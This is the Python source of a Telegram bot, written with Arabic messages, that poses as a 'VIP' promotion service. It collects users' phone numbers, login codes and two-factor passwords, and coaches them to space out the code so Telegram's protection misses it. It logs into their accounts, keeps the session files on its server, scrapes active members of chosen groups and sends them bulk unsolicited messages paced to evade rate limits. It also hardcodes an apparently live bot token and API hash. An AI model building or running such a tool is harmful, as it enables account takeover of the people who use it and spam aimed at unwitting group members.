import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import (
    FloodWaitError,
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
)

# 🔑 بيانات البوت الأساسية
BOT_TOKEN = "8764151152:AAFSl3l-6baXHUBE_91y4b1SvzPX5z48_6c"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

print("⚡ جاري تشغيل المحرك الرئيسي للبوت VIP...")
bot = TelegramClient("vip_control_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ذاكرة حفظ الجلسات والبيانات الحية
user_data = {}

# ------------------- دالة رسم شريط التقدم -------------------
def create_progress_bar(current, total):
    percent = int((current / total) * 100)
    filled_length = int(10 * current // total)
    bar = "█" * filled_length + "░" * (10 - filled_length)
    return f"[{bar}] {percent}% ({current}/{total})"

# ------------------- أمر البدء /start -------------------
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    sender_id = event.sender_id
    user_data[sender_id] = {"step": "waiting_phone"}
    
    welcome_text = (
        "👑 **أهلاً بك في منصة السحب والإرسال الذكي (VIP)**\n"
        "──────────────────────────────\n"
        "🚀 **المنصة الأكثر أماناً وسرعة للترويج المستهدف.**\n\n"
        "📱 **للبدء:** يُرجى إرسال **رقم هاتفك** المربوط بالتليجرام مسبوقاً برمز الدولة.\n"
        "*(مثال: `+201234567890`)*"
    )
    buttons = [[Button.inline("❌ إلغاء العملية", data="cancel")]]
    await event.respond(welcome_text, buttons=buttons)

# ------------------- استقبال الأزرار الشفافة -------------------
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    sender_id = event.sender_id
    data = event.data.decode("utf-8")

    if data == "cancel":
        user_data.pop(sender_id, None)
        await event.edit("⛔ **تم إلغاء العملية بنجاح.**\n\nللبدء من جديد أرسل: /start")
    
    elif data == "confirm_start":
        await event.edit("🚀 **بدأت العملية الآن! جاري فحص وسحب المتفاعلين...**")
        await run_scraping_process(event, sender_id)

# ------------------- معالج الرسائل وخطوات العميل -------------------
@bot.on(events.NewMessage)
async def message_handler(event):
    if event.text.startswith("/"):
        return

    sender_id = event.sender_id
    if sender_id not in user_data:
        return

    step = user_data[sender_id].get("step")

    # 1️⃣ استقبال رقم الهاتف
    if step == "waiting_phone":
        phone = event.text.strip()
        user_data[sender_id]["phone"] = phone
        user_data[sender_id]["step"] = "waiting_code"
        
        msg = (
            "📲 **تم استلام الرقم بنجاح!**\n\n"
            "📩 أرسل الآن **كود التحقق** الذي وصلك في تطبيق التليجرام.\n"
            "⚠️ *ملاحظة للأمان:* اكتب الكود وبينه مسافات لتجنب حظره من النظام.\n"
            "*(مثال: اكتب `1 2 3 4 5` بدلاً من `12345`)*"
        )
        await event.respond(msg, buttons=[[Button.inline("❌ إلغاء", data="cancel")]])

    # 2️⃣ استقبال كود التحقق
    elif step == "waiting_code":
        code = event.text.replace(" ", "").strip()
        phone = user_data[sender_id]["phone"]
        
        loading_msg = await event.respond("🔄 **جاري التحقق وتسجيل الدخول الآمن...**")
        client = TelegramClient(f"session_{sender_id}", API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone, code)
            user_data[sender_id]["client"] = client
            user_data[sender_id]["step"] = "waiting_group"
            
            msg = (
                "✅ **تم الاتصال بالحساب بنجاح!**\n"
                "──────────────────────────────\n"
                "🎯 أرسل الآن **رابط أو يوزر الجروب** المستهدف.\n"
                "*(مثال: `@group_name` أو `https://t.me/group_name`)*"
            )
            await loading_msg.delete()
            await event.respond(msg, buttons=[[Button.inline("❌ إلغاء", data="cancel")]])

        except SessionPasswordNeededError:
            user_data[sender_id]["temp_client"] = client
            user_data[sender_id]["step"] = "waiting_password"
            await loading_msg.delete()
            await event.respond("🔒 **الحساب محمي بالتحقق بخطوتين.**\nأرسل كلمة المرور (Password) الخاصة بك:")

        except PhoneCodeInvalidError:
            await loading_msg.delete()
            await event.respond("❌ **كود التحقق غير صحيح!** أعد كتابته بشكل صحيح:")

        except Exception as e:
            await loading_msg.delete()
            await event.respond(f"❌ **حدث خطأ:** `{e}`\nأرسل /start للبدء من جديد.")
            user_data.pop(sender_id, None)

    # 3️⃣ كلمة المرور (إذا وجدت)
    elif step == "waiting_password":
        password = event.text.strip()
        client = user_data[sender_id]["temp_client"]
        try:
            await client.sign_in(password=password)
            user_data[sender_id]["client"] = client
            user_data[sender_id]["step"] = "waiting_group"
            await event.respond("✅ **تم تسجيل الدخول بنجاح!**\n\n🎯 أرسل الآن **رابط الجروب** المستهدف:")
        except PasswordHashInvalidError:
            await event.respond("❌ **كلمة المرور غير صحيحة!** أعد إرسالها:")

    # 4️⃣ استقبال الجروب
    elif step == "waiting_group":
        user_data[sender_id]["target_group"] = event.text.strip()
        user_data[sender_id]["step"] = "waiting_message"
        
        msg = (
            "📌 **تم حفظ الهدف!**\n\n"
            "📝 أرسل الآن **نص الرسالة أو رابط الدعوة** المراد إرساله للجمهور:"
        )
        await event.respond(msg, buttons=[[Button.inline("❌ إلغاء", data="cancel")]])

    # 5️⃣ استقبال الرسالة
    elif step == "waiting_message":
        user_data[sender_id]["message_text"] = event.text
        user_data[sender_id]["step"] = "waiting_limit"
        
        msg = (
            "📊 **كم عدد الأشخاص المطلوب الإرسال لهم اليوم؟**\n"
            "*(أرسل رقماً فقط، يُفضل بين 10 إلى 30 لضمان أمان الحساب)*"
        )
        await event.respond(msg)

    # 6️⃣ استقبال العدد والفاصل الزمني
    elif step == "waiting_limit":
        try:
            limit = int(event.text.strip())
            user_data[sender_id]["limit"] = limit
            user_data[sender_id]["step"] = "waiting_delay"
            
            msg = (
                "⏱️ **حدد الفاصل الزمني بالثواني بين كل رسالة والأخرى:**\n"
                "*(المنصوح به: `60` ثانية لحماية حسابك من التقييد)*"
            )
            await event.respond(msg)
        except ValueError:
            await event.respond("❌ **يرجى إدخال أرقام فقط!**")

    # 7️⃣ استقبال الوقت وتأكيد التشغيل
    elif step == "waiting_delay":
        try:
            delay = int(event.text.strip())
            user_data[sender_id]["delay"] = delay
            
            # ملخص الحملة
            summary = (
                "📋 **مراجعة وتأكيد بيانات الحملة (VIP)**\n"
                "──────────────────────────────\n"
                f"🎯 **الجروب:** `{user_data[sender_id]['target_group']}`\n"
                f"👥 **العدد المحدد:** `{user_data[sender_id]['limit']} مستخدم`\n"
                f"⏱️ **الفاصل الزمني:** `{delay} ثانية`\n"
                f"💬 **النص:**\n`{user_data[sender_id]['message_text'][:100]}...`\n"
                "──────────────────────────────\n"
                "هل ترغب في بدء التثبيت والإرسال الآن؟"
            )
            buttons = [
                [Button.inline("🚀 إطلاق الحملة الآن", data="confirm_start")],
                [Button.inline("❌ إلغاء", data="cancel")]
            ]
            await event.respond(summary, buttons=buttons)

        except ValueError:
            await event.respond("❌ **يرجى إدخال أرقام فقط!**")

# ------------------- عملية السحب والإرسال الفعلية -------------------
async def run_scraping_process(event, sender_id):
    data = user_data[sender_id]
    client = data["client"]
    target_group = data["target_group"]
    message_text = data["message_text"]
    daily_limit = data["limit"]
    delay = data["delay"]

    status_msg = await bot.send_message(sender_id, "🔎 **جاري تحليل الجروب وسحب أصحاب الرسائل المتفاعلين...**")

    active_users = []
    try:
        # قراءة الشات لسحب الأعضاء النشطين
        async for message in client.iter_messages(target_group, limit=400):
            if message.sender_id and message.sender:
                user = message.sender
                if getattr(user, "bot", False) or getattr(user, "deleted", False) or not user.username:
                    continue
                if user.id not in [u["id"] for u in active_users]:
                    active_users.append({"id": user.id, "username": user.username})

        total_found = len(active_users)
        if total_found == 0:
            await status_msg.edit("❌ **لم يتم العثور على مستفاعلين متاحين لديهم Username في هذا الجروب.**")
            return

        target_count = min(daily_limit, total_found)
        await status_msg.edit(f"✅ **تم العثور على {total_found} مستخدم متفاعل.**\n🚀 **بدء الإرسال لـ {target_count} شخص...**")

        sent_count = 0
        for u in active_users:
            if sent_count >= target_count:
                break

            username = u["username"]
            try:
                await client.send_message(username, message_text)
                sent_count += 1
                
                # تحديث شريط التقدم الفخم
                progress = create_progress_bar(sent_count, target_count)
                update_text = (
                    f"⚡ **حملة الإرسال شغالـة الآن...**\n\n"
                    f"📊 **التقدم:**\n`{progress}`\n\n"
                    f"👤 **آخر إرسال إلى:** @{username}\n"
                    f"⏱️ **الانتظار للرسالة القادمة:** {delay} ثانية..."
                )
                await status_msg.edit(update_text)
                await asyncio.sleep(delay)

            except FloodWaitError as e:
                await bot.send_message(sender_id, f"⚠️ **تنبيه أمان تليجرام:** يطلب النظام الانتظار لمدة {e.seconds} ثانية حمايةً لحسابك...")
                await asyncio.sleep(e.seconds)
            except Exception as ex:
                await asyncio.sleep(3)

        # رسالة النهاية الاحترافية
        final_text = (
            "🎉 **تمت الحملة بنجاح كامل!**\n"
            "──────────────────────────────\n"
            f"✅ **إجمالي الرسائل المرسلة:** `{sent_count}`\n"
            f"🎯 **الحالة:** مكتمل بدون أي مشاكل أمان.\n\n"
            "شكراً لاستخدامك منصتنا 👑"
        )
        await bot.send_message(sender_id, final_text)

    except Exception as e:
        await bot.send_message(sender_id, f"❌ **حدث خطأ أثناء العملية:** `{e}`")

    # تنظيف الجلسة
    user_data.pop(sender_id, None)

print("👑 بوت التحكم الـ VIP يعمل الآن بنجاح على أرقام السيرفر!")
bot.run_until_complete(bot.run_until_disconnected())
